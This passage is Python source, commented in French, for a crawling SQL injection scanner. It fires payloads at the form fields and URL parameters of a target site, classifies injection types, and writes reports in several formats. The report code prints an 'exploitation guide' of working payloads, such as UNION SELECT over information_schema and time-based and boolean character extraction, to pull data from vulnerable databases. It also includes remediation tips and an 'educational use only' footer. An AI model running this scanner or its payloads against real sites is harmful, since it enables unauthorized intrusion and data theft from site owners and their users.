            'mysql': ['MySQL', 'MariaDB', 'mysqli', 'mysql_'],
            'postgresql': ['PostgreSQL', 'pg_', 'pgsql'],
            'mssql': ['SQL Server', 'Microsoft SQL', 'mssql', 'sysobjects'],
            'oracle': ['ORA-', 'Oracle', 'SQLORA'],
            'sqlite': ['SQLite', 'sqlite3'],
            'access': ['JET Database', 'Microsoft Access']
        }
        
        for db, signatures in db_signatures.items():
            for sig in signatures:
                if sig in response_text:
                    return db
                    
        return None
        
    def extract_error_evidence(self, response_text, max_length=200):
        """Extraire la preuve d'une erreur SQL à partir du texte de la réponse."""
        for pattern in self.all_error_patterns:
            match = pattern.search(response_text)
            if match:
                # Obtenir le contexte autour de la correspondance
                start = max(0, match.start() - 50)
                end = min(len(response_text), match.end() + 50)
                evidence = response_text[start:end]
                
                # Tronquer si trop long
                if len(evidence) > max_length:
                    evidence = evidence[:max_length] + "..."
                    
                return evidence
        return "Aucune preuve d'erreur spécifique trouvée"
    
    def determine_risk_level(self, vuln_type, db_type, payload):
        """Déterminer le niveau de risque d'une vulnérabilité."""
        # Vulnérabilités à risque élevé
        if vuln_type in ['union-based', 'stacked-queries']:
            return 'high'
            
        # Vérifier la complexité du payload
        if any(high_risk in payload.lower() for high_risk in ['union select', 'information_schema', 'table_name', 'column_name']):
            return 'high'
            
        # Vulnérabilités à risque moyen
        if vuln_type in ['error-based', 'time-based', 'boolean-based']:
            return 'medium'
            
        # Vulnérabilités à risque faible
        if vuln_type in ['simple-error']:
            return 'low'
            
        # Par défaut à moyen
        return 'medium'
    
    def test_form(self, url, form):
        """Tester un formulaire pour les vulnérabilités d'injection SQL."""
        form_details = self.get_form_details(form)
        target_url = urllib.parse.urljoin(url, form_details['action']) if form_details['action'] else url
        method = form_details['method']
        
        if self.verbose:
            console.print(f"[blue][*] Test du formulaire sur {url} (Action: {target_url}, Méthode: {method.upper()})[/blue]")
        
        # Tester chaque champ d'entrée qui pourrait être injectable
        for input_data in form_details['inputs']:
            # Ignorer les entrées non textuelles
            input_type = input_data.get('type', '')
            if input_type.lower() not in ['text', 'search', 'email', 'url', 'password', ''] and input_type.lower() != 'hidden':
                continue
                
            input_name = input_data.get('name', '')
            if not input_name:
                continue
                
            # Tester ce champ d'entrée avec chaque payload
            for payload in self.payloads:
                # Préparer les données pour la requête
                data = {}
                for input_item in form_details['inputs']:
                    if input_item.get('type') == 'submit' and input_item.get('name'):
                        # Utiliser la valeur du bouton de soumission
                        data[input_item.get('name')] = input_item.get('value', '')
                    elif input_item.get('name') == input_name:
                        # C'est le champ que nous testons, injecter le payload
                        data[input_item.get('name')] = payload
                    elif input_item.get('name'):
                        # Utiliser la valeur par défaut pour les autres champs
                        data[input_item.get('name')] = input_item.get('value', '')
                
                # Envoyer la requête
                try:
                    if method.lower() == 'post':
                        response = self.session.post(target_url, data=data, timeout=self.timeout, verify=False)
                    else:  # GET
                        response = self.session.get(target_url, params=data, timeout=self.timeout, verify=False)
                        
                    # Vérifier si la réponse indique une vulnérabilité
                    is_vulnerable, vuln_type, db_type = self.is_vulnerable(response, payload)
                    
                    if is_vulnerable:
                        # Déterminer le niveau de risque
                        risk_level = self.determine_risk_level(vuln_type, db_type, payload)
                        
                        # Créer une entrée de vulnérabilité
                        vulnerability = {
                            'url': target_url,
                            'method': method.upper(),
                            'form_action': form_details['action'],
                            'input': input_name,
                            'payload': payload,
                            'type': vuln_type,
                            'db_type': db_type,
                            'risk': risk_level,
                            'evidence': self.extract_error_evidence(response.text)
                        }
                        self.vulnerable_urls.append(vulnerability)
                        
                        # Afficher le résultat avec une couleur basée sur le risque
                        risk_color = "yellow"  # Moyen par défaut
                        if risk_level == 'high':
                            risk_color = "red"
                        elif risk_level == 'low':
                            risk_color = "green"
                            
                        console.print(f"[green][+] Injection SQL trouvée ![/green] [{risk_color}]{risk_level.upper()}[/{risk_color}]")
                        console.print(f"    URL: {target_url}")
                        console.print(f"    Méthode: {method.upper()}")
                        console.print(f"    Entrée: {input_name}")
                        console.print(f"    Type: {vuln_type}")
                        console.print(f"    Base de données: {db_type if db_type else 'Inconnue'}")
                        console.print(f"    Payload: {payload}\n")
                        
                        # Pas besoin de tester plus de payloads pour cette entrée si nous avons trouvé une vulnérabilité
                        break
                    
                    # Tester les vulnérabilités basées sur le temps et booléennes
                    if not is_vulnerable and self.risk_level > 1:
                        # Tester les vulnérabilités basées sur le temps
                        time_vuln, time_db = self.is_vulnerable_to_time_based(
                            target_url, 
                            method, 
                            data=data if method.lower() == 'post' else None,
                            params=data if method.lower() == 'get' else None
                        )
                        
                        if time_vuln:
                            # Créer une entrée de vulnérabilité pour le time-based
                            vulnerability = {
                                'url': target_url,
                                'method': method.upper(),
                                'form_action': form_details['action'],
                                'input': input_name,
                                'payload': payload,
                                'type': 'time-based',
                                'db_type': time_db,
                                'risk': 'medium',
                                'evidence': 'Délai de réponse détecté'
                            }
                            self.vulnerable_urls.append(vulnerability)
                            
                            console.print(f"[green][+] Injection SQL basée sur le temps trouvée ![/green] [yellow]MEDIUM[/yellow]")
                            console.print(f"    URL: {target_url}")
                            console.print(f"    Méthode: {method.upper()}")
                            console.print(f"    Entrée: {input_name}")
                            console.print(f"    Base de données: {time_db if time_db else 'Inconnue'}")
                            console.print(f"    Payload: {payload}\n")
                            
                            break
                        
                        # Tester les vulnérabilités booléennes
                        bool_vuln, bool_db = self.is_vulnerable_to_boolean_based(
                            target_url, 
                            method, 
                            data=data if method.lower() == 'post' else None,
                            params=data if method.lower() == 'get' else None
                        )
                        
                        if bool_vuln:
                            # Créer une entrée de vulnérabilité pour le boolean-based
                            vulnerability = {
                                'url': target_url,
                                'method': method.upper(),
                                'form_action': form_details['action'],
                                'input': input_name,
                                'payload': payload,
                                'type': 'boolean-based',
                                'db_type': bool_db,
                                'risk': 'medium',
                                'evidence': 'Réponses différentes pour les conditions TRUE/FALSE'
                            }
                            self.vulnerable_urls.append(vulnerability)
                            
                            console.print(f"[green][+] Injection SQL booléenne trouvée ![/green] [yellow]MEDIUM[/yellow]")
                            console.print(f"    URL: {target_url}")
                            console.print(f"    Méthode: {method.upper()}")
                            console.print(f"    Entrée: {input_name}")
                            console.print(f"    Base de données: {bool_db if bool_db else 'Inconnue'}")
                            console.print(f"    Payload: {payload}\n")
                            
                            break
                        
                except Exception as e:
                    if self.verbose:
                        console.print(f"[red][!] Erreur lors du test de {target_url}: {e}[/red]")
                    continue
                    
    def test_get_parameter(self, url):
        """Tester les paramètres GET de l'URL pour les vulnérabilités d'injection SQL."""
        parsed_url = urllib.parse.urlparse(url)
        
        # Ignorer s'il n'y a pas de paramètres de requête ou si nous avons déjà testé cette URL
        if not parsed_url.query or url in self.tested_urls:
            return
            
        self.tested_urls.add(url)
        
        if self.verbose:
            console.print(f"[blue][*] Test des paramètres GET à {url}[/blue]")
        
        # Analyser les paramètres de requête
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        # Tester chaque paramètre avec chaque payload
        for param_name, param_values in query_params.items():
            original_value = param_values[0] if param_values else ''
            
            for payload in self.payloads:
                # Créer une copie des paramètres de requête
                new_params = query_params.copy()
                new_params[param_name] = [original_value + payload]
                
                # Reconstruire l'URL avec les nouveaux paramètres de requête
                new_query = urllib.parse.urlencode(new_params, doseq=True)
                new_url = urllib.parse.urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    new_query,
                    parsed_url.fragment
                ))
                
                # Envoyer la requête
                try:
                    response = self.session.get(new_url, timeout=self.timeout, verify=False)
                    
                    # Vérifier si la réponse indique une vulnérabilité
                    is_vulnerable, vuln_type, db_type = self.is_vulnerable(response, payload)
                    
                    if is_vulnerable:
                        # Déterminer le niveau de risque
                        risk_level = self.determine_risk_level(vuln_type, db_type, payload)
                        
                        # Créer une entrée de vulnérabilité
                        vulnerability = {
                            'url': url,
                            'method': 'GET',
                            'input': param_name,
                            'payload': payload,
                            'type': vuln_type,
                            'db_type': db_type,
                            'risk': risk_level,
                            'evidence': self.extract_error_evidence(response.text)
                        }
                        self.vulnerable_urls.append(vulnerability)
                        
                        # Afficher le résultat avec une couleur basée sur le risque
                        risk_color = "yellow"  # Moyen par défaut
                        if risk_level == 'high':
                            risk_color = "red"
                        elif risk_level == 'low':
                            risk_color = "green"
                            
                        console.print(f"[green][+] Injection SQL trouvée ![/green] [{risk_color}]{risk_level.upper()}[/{risk_color}]")
                        console.print(f"    URL: {url}")
                        console.print(f"    Méthode: GET")
                        console.print(f"    Paramètre: {param_name}")
                        console.print(f"    Type: {vuln_type}")
                        console.print(f"    Base de données: {db_type if db_type else 'Inconnue'}")
                        console.print(f"    Payload: {payload}\n")
                        
                        # Pas besoin de tester plus de payloads pour ce paramètre
                        break
                        
                    # Tester les vulnérabilités basées sur le temps et booléennes
                    if not is_vulnerable and self.risk_level > 1:
                        # Créer un dictionnaire de paramètres pour les tests
                        params_dict = {}
                        for p_name, p_values in query_params.items():
                            params_dict[p_name] = p_values[0] if p_values else ''
                        
                        # Tester les vulnérabilités basées sur le temps
                        time_vuln, time_db = self.is_vulnerable_to_time_based(
                            url.split('?')[0],  # URL de base sans paramètres
                            'get', 
                            params=params_dict
                        )
                        
                        if time_vuln:
                            # Créer une entrée de vulnérabilité pour le time-based
                            vulnerability = {
                                'url': url,
                                'method': 'GET',
                                'input': param_name,
                                'payload': payload,
                                'type': 'time-based',
                                'db_type': time_db,
                                'risk': 'medium',
                                'evidence': 'Délai de réponse détecté'
                            }
                            self.vulnerable_urls.append(vulnerability)
                            
                            console.print(f"[green][+] Injection SQL basée sur le temps trouvée ![/green] [yellow]MEDIUM[/yellow]")
                            console.print(f"    URL: {url}")
                            console.print(f"    Méthode: GET")
                            console.print(f"    Paramètre: {param_name}")
                            console.print(f"    Base de données: {time_db if time_db else 'Inconnue'}")
                            console.print(f"    Payload: {payload}\n")
                            
                            break
                        
                        # Tester les vulnérabilités booléennes
                        bool_vuln, bool_db = self.is_vulnerable_to_boolean_based(
                            url.split('?')[0],  # URL de base sans paramètres
                            'get', 
                            params=params_dict
                        )
                        
                        if bool_vuln:
                            # Créer une entrée de vulnérabilité pour le boolean-based
                            vulnerability = {
                                'url': url,
                                'method': 'GET',
                                'input': param_name,
                                'payload': payload,
                                'type': 'boolean-based',
                                'db_type': bool_db,
                                'risk': 'medium',
                                'evidence': 'Réponses différentes pour les conditions TRUE/FALSE'
                            }
                            self.vulnerable_urls.append(vulnerability)
                            
                            console.print(f"[green][+] Injection SQL booléenne trouvée ![/green] [yellow]MEDIUM[/yellow]")
                            console.print(f"    URL: {url}")
                            console.print(f"    Méthode: GET")
                            console.print(f"    Paramètre: {param_name}")
                            console.print(f"    Base de données: {bool_db if bool_db else 'Inconnue'}")
                            console.print(f"    Payload: {payload}\n")
                            
                            break
                        
                except Exception as e:
                    if self.verbose:
                        console.print(f"[red][!] Erreur lors du test du paramètre GET à {url}: {e}[/red]")
                    continue
                    
    def scan(self, max_urls=50):
        """Démarrer le processus de scan."""
        self.print_banner()
        
        # Enregistrer l'heure de début
        self.start_time = datetime.datetime.now()
        
        console.print("[yellow][*] Démarrage du scan...[/yellow]")
        
        # Analyser robots.txt si activé
        if self.respect_robots:
            self.parse_robots_txt()
        
        # Commencer par l'URL de base
        urls_to_scan = [self.base_url]
        scanned_count = 0
        
        # Utiliser ThreadPoolExecutor pour le scan parallèle
        with Progress(
            SpinnerColumn(),
            "[progress.description]{task.description}",
            BarColumn(),
            "[progress.percentage]{task.percentage:>3.0f}%",
            "|",
            "[progress.elapsed]{task.elapsed}",
            console=console
        ) as progress:
            scan_task = progress.add_task("[cyan]Scan en cours...", total=max_urls)
            
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = []
                
                while urls_to_scan and scanned_count < max_urls:
                    # Obtenir le prochain lot d'URLs à traiter (limité par le nombre de threads)
                    batch_size = min(self.threads, max_urls - scanned_count, len(urls_to_scan))
                    current_batch = []
                    
                    for _ in range(batch_size):
                        if not urls_to_scan:
                            break
                        url = urls_to_scan.pop(0)
                        
                        # Ignorer si déjà testé
                        if url in self.tested_urls:
                            continue
                        
                        self.tested_urls.add(url)
                        current_batch.append(url)
                        scanned_count += 1
                    
                    # Soumettre les tâches au pool de threads
                    for url in current_batch:
                        if self.verbose:
                            console.print(f"[blue][*] Scan de {url} ({scanned_count}/{max_urls})[/blue]")
                        
                        # Soumettre la tâche pour scanner cette URL
                        future = executor.submit(self.scan_url, url)
                        futures.append(future)
                    
                    # Attendre que tous les futures soient terminés
                    for future in futures:
                        # Obtenir les nouveaux liens découverts pendant le scan
                        new_links = future.result()
                        
                        # Ajouter de nouveaux liens à la file d'attente
                        for link in new_links:
                            if link not in self.tested_urls and link not in urls_to_scan:
                                urls_to_scan.append(link)
                    
                    # Effacer la liste des futures pour le prochain lot
                    futures = []
                    
                    # Mettre à jour la barre de progression
                    progress.update(scan_task, completed=min(scanned_count, max_urls))
        
        # Enregistrer l'heure de fin
        self.end_time = datetime.datetime.now()
        
        # Calculer la durée du scan
        duration = self.end_time - self.start_time
        
        console.print("[yellow][*] Scan terminé ![/yellow]")
        console.print(f"[yellow][*] URLs scannées: {len(self.tested_urls)}[/yellow]")
        console.print(f"[yellow][*] Durée du scan: {str(duration).split('.')[0]}[/yellow]")
        console.print(f"[yellow][*] WAF détecté: {'Oui - ' + self.waf_type.upper() if self.waf_detected else 'Non'}[/yellow]")
        
        # Générer et afficher le rapport de vulnérabilité
        if self.vulnerable_urls:
            console.print(f"\n[green][+] {len(self.vulnerable_urls)} vulnérabilités d'injection SQL trouvées:[/green]\n")
            self.generate_vulnerability_report()
            
            # Exporter le rapport si le format est spécifié
            if self.export_format:
                result = self.export_report(self.export_format)
                console.print(f"\n[blue][*] {result}[/blue]")
        else:
            console.print(f"\n[green][+] Aucune vulnérabilité d'injection SQL n'a été trouvée.[/green]")
    
    def scan_url(self, url):
        """Scanner une seule URL pour les vulnérabilités d'injection SQL et renvoyer les liens découverts."""
        discovered_links = set()
        
        try:
            # Tester les paramètres GET dans l'URL
            self.test_get_parameter(url)
            
            # Extraire et tester les formulaires
            forms = self.extract_forms(url)
            for form in forms:
                self.test_form(url, form)
            
            # Extraire les liens pour un scan ultérieur
            links = self.extract_links(url, depth=0)
            discovered_links.update(links)
            
            return discovered_links
        except Exception as e:
            if self.verbose:
                console.print(f"[red][!] Erreur lors du scan de {url}: {e}[/red]")
            return set()
            
    def generate_vulnerability_report(self):
        """Générer un rapport détaillé de toutes les vulnérabilités trouvées."""
        if not self.vulnerable_urls:
            console.print("Aucune vulnérabilité SQL injection détectée.")
            return
        
        # Créer une table pour les vulnérabilités
        table = Table(title="Vulnérabilités SQL Injection Détectées", show_header=True, header_style="bold cyan")
        
        # Ajouter les colonnes
        table.add_column("#", style="dim")
        table.add_column("URL", style="yellow")
        table.add_column("Méthode", style="cyan")
        table.add_column("Paramètre", style="green")
        table.add_column("Type", style="magenta")
        table.add_column("DB", style="blue")
        table.add_column("Risque", style="red")
        
        # Grouper les vulnérabilités par niveau de risque
        high_risk = [v for v in self.vulnerable_urls if v.get('risk') == 'high']
        medium_risk = [v for v in self.vulnerable_urls if v.get('risk') == 'medium']
        low_risk = [v for v in self.vulnerable_urls if v.get('risk') == 'low']
        
        # Ajouter les vulnérabilités à la table, en commençant par les plus risquées
        index = 1
        
        # Vulnérabilités à haut risque
        for vuln in high_risk:
            table.add_row(
                str(index),
                vuln.get('url', '').split('?')[0],  # URL de base sans paramètres
                vuln.get('method', 'GET'),
                vuln.get('input', 'N/A'),
                vuln.get('type', 'Unknown'),
                vuln.get('db_type', 'Unknown'),
                "[bold red]HIGH[/bold red]"
            )
            index += 1
        
        # Vulnérabilités à risque moyen
        for vuln in medium_risk:
            table.add_row(
                str(index),
                vuln.get('url', '').split('?')[0],  # URL de base sans paramètres
                vuln.get('method', 'GET'),
                vuln.get('input', 'N/A'),
                vuln.get('type', 'Unknown'),
                vuln.get('db_type', 'Unknown'),
                "[bold yellow]MEDIUM[/bold yellow]"
            )
            index += 1
        
        # Vulnérabilités à faible risque
        for vuln in low_risk:
            table.add_row(
                str(index),
                vuln.get('url', '').split('?')[0],  # URL de base sans paramètres
                vuln.get('method', 'GET'),
                vuln.get('input', 'N/A'),
                vuln.get('type', 'Unknown'),
                vuln.get('db_type', 'Unknown'),
                "[bold green]LOW[/bold green]"
            )
            index += 1
        
        # Afficher la table
        console.print(table)
        
        # Afficher des détails supplémentaires pour chaque vulnérabilité
        console.print("\n[bold cyan]Détails des Vulnérabilités:[/bold cyan]")
        
        for i, vuln in enumerate(self.vulnerable_urls, 1):
            # Déterminer la couleur en fonction du niveau de risque
            risk_level = vuln.get('risk', 'medium')
            if risk_level == 'high':
                risk_color = "red"
            elif risk_level == 'low':
                risk_color = "green"
            else:
                risk_color = "yellow"
                
            console.print(f"\n[bold {risk_color}]Vulnérabilité #{i} - {risk_level.upper()}[/bold {risk_color}]")
            console.print(f"  URL: {vuln.get('url')}")
            console.print(f"  Méthode: {vuln.get('method')}")
            console.print(f"  Paramètre/Entrée: {vuln.get('input')}")
            console.print(f"  Type d'injection: {vuln.get('type')}")
            console.print(f"  Base de données: {vuln.get('db_type', 'Inconnue')}")
            console.print(f"  Payload: {vuln.get('payload')}")
            
            # Afficher la preuve si disponible
            evidence = vuln.get('evidence')
            if evidence and evidence != "Aucune preuve d'erreur spécifique trouvée":
                console.print(f"  Preuve:\n    {evidence}")
        
        # Ajouter des conseils d'exploitation et de correction
        self._print_exploitation_guidance()
        self._print_remediation_tips()
    
    def _print_exploitation_guidance(self):
        """Afficher des conseils sur l'exploitation des vulnérabilités trouvées."""
        console.print("\n[bold cyan]GUIDE D'EXPLOITATION:[/bold cyan]")
        console.print("=" * 80)
        console.print("Pour exploiter ces vulnérabilités, vous pouvez utiliser les techniques suivantes:\n")
        
        if any(v.get('type') == 'union-based' for v in self.vulnerable_urls):
            console.print("[bold magenta][+] Exploitation des injections UNION:[/bold magenta]")
            console.print("    - Déterminer le nombre de colonnes: ' UNION SELECT NULL,NULL,NULL-- -")
            console.print("    - Identifier les colonnes affichables: ' UNION SELECT 1,2,3-- -")
            console.print("    - Extraire des données: ' UNION SELECT table_name,column_name,1 FROM information_schema.columns-- -\n")
        
        if any(v.get('type') == 'error-based' for v in self.vulnerable_urls):
            console.print("[bold magenta][+] Exploitation des injections basées sur les erreurs:[/bold magenta]")
            console.print("    - Extraire des données via les messages d'erreur: ' AND (SELECT 1 FROM (SELECT COUNT(*),")
            console.print("      CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -\n")
        
        if any(v.get('type') == 'time-based' for v in self.vulnerable_urls):
            console.print("[bold magenta][+] Exploitation des injections basées sur le temps:[/bold magenta]")
            console.print("    - Extraire des données caractère par caractère: ' AND IF(SUBSTR(user(),1,1)='r',SLEEP(3),0)-- -\n")
        
        if any(v.get('type') == 'boolean-based' for v in self.vulnerable_urls):
            console.print("[bold magenta][+] Exploitation des injections booléennes:[/bold magenta]")
            console.print("    - Extraire des données bit par bit: ' AND ASCII(SUBSTR((SELECT user()),1,1))>90-- -\n")
    
    def _print_remediation_tips(self):
        """Afficher des conseils sur la correction des vulnérabilités trouvées."""
        console.print("[bold cyan]RECOMMANDATIONS DE CORRECTION:[/bold cyan]")
        console.print("=" * 80)
        console.print("1. Utilisez des requêtes préparées ou des procédures stockées")
        console.print("2. Validez et filtrez toutes les entrées utilisateur")
        console.print("3. Appliquez le principe du moindre privilège pour les comptes de base de données")
        console.print("4. Utilisez un WAF (Web Application Firewall) pour une protection supplémentaire")
        console.print("5. Implémentez des contrôles d'accès appropriés et des journaux d'audit")
        console.print("6. Maintenez vos systèmes et bibliothèques à jour")
        console.print("7. Effectuez des tests de pénétration réguliers")
        
    def export_report(self, format_type):
        """Exporter le rapport de vulnérabilité dans le format spécifié.
        
        Args:
            format_type: Format d'exportation (json, html, csv, text)
            
        Returns:
            Message indiquant où le rapport a été exporté
        """
        if not self.vulnerable_urls:
            return "Aucune vulnérabilité à exporter."
            
        # Créer un nom de fichier basé sur l'URL et la date
        domain = urllib.parse.urlparse(self.base_url).netloc.replace(':', '_')
        timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        base_filename = f"sqlinjection_report_{domain}_{timestamp}"
        
        # Exporter au format JSON
        if format_type.lower() == 'json':
            filename = f"{base_filename}.json"
            with open(filename, 'w') as f:
                json_data = {
                    'scan_info': {
                        'target': self.base_url,
                        'start_time': self.start_time.isoformat() if self.start_time else None,
                        'end_time': self.end_time.isoformat() if self.end_time else None,
                        'duration': str(self.end_time - self.start_time) if self.start_time and self.end_time else None,
                        'urls_scanned': len(self.tested_urls),
                        'waf_detected': self.waf_detected,
                        'waf_type': self.waf_type
                    },
                    'vulnerabilities': self.vulnerable_urls
                }
                json.dump(json_data, f, indent=4)
            
            return f"Rapport exporté au format JSON: {filename}"
            
        # Exporter au format HTML
        elif format_type.lower() == 'html':
            filename = f"{base_filename}.html"
            
            # Créer un rapport HTML simple
            with open(filename, 'w') as f:
                f.write(f"""<!DOCTYPE html>
<html>
<head>
    <title>Rapport de Vulnérabilités SQL Injection - {domain}</title>
    <meta charset="UTF-8">
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        h1, h2, h3 {{ color: #2c3e50; }}
        .container {{ max-width: 1200px; margin: 0 auto; }}
        table {{ border-collapse: collapse; width: 100%; margin-bottom: 20px; }}
        th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
        th {{ background-color: #f2f2f2; }}
        tr:nth-child(even) {{ background-color: #f9f9f9; }}
        .high {{ color: #e74c3c; font-weight: bold; }}
        .medium {{ color: #f39c12; font-weight: bold; }}
        .low {{ color: #27ae60; font-weight: bold; }}
        .details {{ margin-bottom: 30px; border-left: 4px solid #3498db; padding-left: 15px; }}
        .evidence {{ background-color: #f8f9fa; padding: 10px; border-radius: 4px; font-family: monospace; white-space: pre-wrap; }}
        .guidance {{ background-color: #eaf2f8; padding: 15px; border-radius: 4px; margin-top: 20px; }}
        .remediation {{ background-color: #eafaf1; padding: 15px; border-radius: 4px; margin-top: 20px; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>Rapport de Vulnérabilités SQL Injection</h1>
        <h2>Informations de Scan</h2>
        <p><strong>Cible:</strong> {self.base_url}</p>
        <p><strong>Date de début:</strong> {self.start_time.strftime('%Y-%m-%d %H:%M:%S') if self.start_time else 'N/A'}</p>
        <p><strong>Date de fin:</strong> {self.end_time.strftime('%Y-%m-%d %H:%M:%S') if self.end_time else 'N/A'}</p>
        <p><strong>Durée:</strong> {str(self.end_time - self.start_time).split('.')[0] if self.start_time and self.end_time else 'N/A'}</p>
        <p><strong>URLs scannées:</strong> {len(self.tested_urls)}</p>
        <p><strong>WAF détecté:</strong> {'Oui - ' + self.waf_type.upper() if self.waf_detected else 'Non'}</p>
        
        <h2>Vulnérabilités Détectées ({len(self.vulnerable_urls)})</h2>
        
        <table>
            <tr>
                <th>#</th>
                <th>URL</th>
                <th>Méthode</th>
                <th>Paramètre</th>
                <th>Type</th>
                <th>Base de données</th>
                <th>Risque</th>
            </tr>
""")
                
                # Ajouter les vulnérabilités au tableau
                for i, vuln in enumerate(self.vulnerable_urls, 1):
                    risk_level = vuln.get('risk', 'medium')
                    risk_class = 'high' if risk_level == 'high' else 'medium' if risk_level == 'medium' else 'low'
                    
                    f.write(f"""            <tr>
                <td>{i}</td>
                <td>{vuln.get('url', '').split('?')[0]}</td>
                <td>{vuln.get('method', 'GET')}</td>
                <td>{vuln.get('input', 'N/A')}</td>
                <td>{vuln.get('type', 'Unknown')}</td>
                <td>{vuln.get('db_type', 'Unknown')}</td>
                <td class="{risk_class}">{risk_level.upper()}</td>
            </tr>
""")
                
                f.write("        </table>\n\n")
                
                # Ajouter les détails de chaque vulnérabilité
                f.write("        <h2>Détails des Vulnérabilités</h2>\n")
                
                for i, vuln in enumerate(self.vulnerable_urls, 1):
                    risk_level = vuln.get('risk', 'medium')
                    risk_class = 'high' if risk_level == 'high' else 'medium' if risk_level == 'medium' else 'low'
                    
                    f.write(f"""        <div class="details">
            <h3>Vulnérabilité #{i} - <span class="{risk_class}">{risk_level.upper()}</span></h3>
            <p><strong>URL:</strong> {vuln.get('url')}</p>
            <p><strong>Méthode:</strong> {vuln.get('method')}</p>
            <p><strong>Paramètre/Entrée:</strong> {vuln.get('input')}</p>
            <p><strong>Type d'injection:</strong> {vuln.get('type')}</p>
            <p><strong>Base de données:</strong> {vuln.get('db_type', 'Inconnue')}</p>
            <p><strong>Payload:</strong> {vuln.get('payload')}</p>
""")
                    
                    # Ajouter la preuve si disponible
                    evidence = vuln.get('evidence')
                    if evidence and evidence != "Aucune preuve d'erreur spécifique trouvée":
                        f.write(f"            <p><strong>Preuve:</strong></p>\n            <div class=\"evidence\">{evidence}</div>\n")
                    
                    f.write("        </div>\n\n")
                
                # Ajouter des conseils d'exploitation
                f.write("""        <div class="guidance">
            <h2>Guide d'Exploitation</h2>
            <p>Pour exploiter ces vulnérabilités, vous pouvez utiliser les techniques suivantes:</p>
""")
                
                if any(v.get('type') == 'union-based' for v in self.vulnerable_urls):
                    f.write("""            <h3>Exploitation des injections UNION</h3>
            <ul>
                <li>Déterminer le nombre de colonnes: <code>' UNION SELECT NULL,NULL,NULL-- -</code></li>
                <li>Identifier les colonnes affichables: <code>' UNION SELECT 1,2,3-- -</code></li>
                <li>Extraire des données: <code>' UNION SELECT table_name,column_name,1 FROM information_schema.columns-- -</code></li>
            </ul>
""")
                
                if any(v.get('type') == 'error-based' for v in self.vulnerable_urls):
                    f.write("""            <h3>Exploitation des injections basées sur les erreurs</h3>
            <ul>
                <li>Extraire des données via les messages d'erreur: <code>' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -</code></li>
            </ul>
""")
                
                if any(v.get('type') == 'time-based' for v in self.vulnerable_urls):
                    f.write("""            <h3>Exploitation des injections basées sur le temps</h3>
            <ul>
                <li>Extraire des données caractère par caractère: <code>' AND IF(SUBSTR(user(),1,1)='r',SLEEP(3),0)-- -</code></li>
            </ul>
""")
                
                if any(v.get('type') == 'boolean-based' for v in self.vulnerable_urls):
                    f.write("""            <h3>Exploitation des injections booléennes</h3>
            <ul>
                <li>Extraire des données bit par bit: <code>' AND ASCII(SUBSTR((SELECT user()),1,1))>90-- -</code></li>
            </ul>
""")
                
                f.write("        </div>\n\n")
                
                # Ajouter des conseils de correction
                f.write("""        <div class="remediation">
            <h2>Recommandations de Correction</h2>
            <ol>
                <li>Utilisez des requêtes préparées ou des procédures stockées</li>
                <li>Validez et filtrez toutes les entrées utilisateur</li>
                <li>Appliquez le principe du moindre privilège pour les comptes de base de données</li>
                <li>Utilisez un WAF (Web Application Firewall) pour une protection supplémentaire</li>
                <li>Implémentez des contrôles d'accès appropriés et des journaux d'audit</li>
                <li>Maintenez vos systèmes et bibliothèques à jour</li>
                <li>Effectuez des tests de pénétration réguliers</li>
            </ol>
        </div>
    </div>
    <footer style="text-align: center; margin-top: 50px; color: #7f8c8d; font-size: 12px;">
        <p>Généré par SQL Injection Scanner le {datetime.datetime.now().strftime('%Y-%m-%d à %H:%M:%S')}</p>
        <p>À des fins éducatives et de tests de sécurité uniquement</p>
    </footer>
</body>
</html>
""")
            
            return f"Rapport exporté au format HTML: {filename}"
            
        # Exporter au format CSV
        elif format_type.lower() == 'csv':
            import csv
            filename = f"{base_filename}.csv"
            
            with open(filename, 'w', newline='') as f:
                writer = csv.writer(f)
                # Écrire l'en-tête
                writer.writerow(['URL', 'Méthode', 'Paramètre', 'Type', 'Base de données', 'Risque', 'Payload', 'Preuve'])
                
                # Écrire les données
                for vuln in self.vulnerable_urls:
                    writer.writerow([
                        vuln.get('url', ''),
                        vuln.get('method', 'GET'),
                        vuln.get('input', 'N/A'),
                        vuln.get('type', 'Unknown'),
                        vuln.get('db_type', 'Unknown'),
                        vuln.get('risk', 'medium').upper(),
                        vuln.get('payload', ''),
                        vuln.get('evidence', 'Aucune preuve')
                    ])
            
            return f"Rapport exporté au format CSV: {filename}"
        
        else:  # Par défaut au format texte
            # Créer un rapport texte
            filename = f"{base_filename}.txt"
            with open(filename, 'w') as f:
                # Informations de scan
                f.write("RAPPORT DE VULNÉRABILITÉS SQL INJECTION\n")
                f.write("=" * 50 + "\n\n")
                f.write(f"Cible: {self.base_url}\n")
                f.write(f"Date de début: {self.start_time.strftime('%Y-%m-%d %H:%M:%S') if self.start_time else 'N/A'}\n")
                f.write(f"Date de fin: {self.end_time.strftime('%Y-%m-%d %H:%M:%S') if self.end_time else 'N/A'}\n")
                f.write(f"Durée: {str(self.end_time - self.start_time).split('.')[0] if self.start_time and self.end_time else 'N/A'}\n")
                f.write(f"URLs scannées: {len(self.tested_urls)}\n")
                f.write(f"WAF détecté: {'Oui - ' + self.waf_type.upper() if self.waf_detected else 'Non'}\n\n")
                
                # Résumé des vulnérabilités
                f.write(f"VULNÉRABILITÉS DÉTECTÉES ({len(self.vulnerable_urls)})\n")
                f.write("=" * 50 + "\n\n")
                
                # Détails de chaque vulnérabilité
                for i, vuln in enumerate(self.vulnerable_urls, 1):
                    f.write(f"Vulnérabilité #{i} - {vuln.get('risk', 'medium').upper()}\n")
                    f.write(f"URL: {vuln.get('url')}\n")
                    f.write(f"Méthode: {vuln.get('method')}\n")
                    f.write(f"Paramètre/Entrée: {vuln.get('input')}\n")
                    f.write(f"Type d'injection: {vuln.get('type')}\n")
                    f.write(f"Base de données: {vuln.get('db_type', 'Inconnue')}\n")
                    f.write(f"Payload: {vuln.get('payload')}\n")
                    
